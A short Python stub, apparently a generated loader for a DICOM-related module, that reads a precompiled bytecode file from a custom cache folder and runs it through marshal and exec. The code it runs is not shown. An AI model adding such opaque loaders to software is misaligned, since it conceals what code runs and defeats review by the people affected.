
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Dicom_b10aaf8b94374def9b9c3446a4043325.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
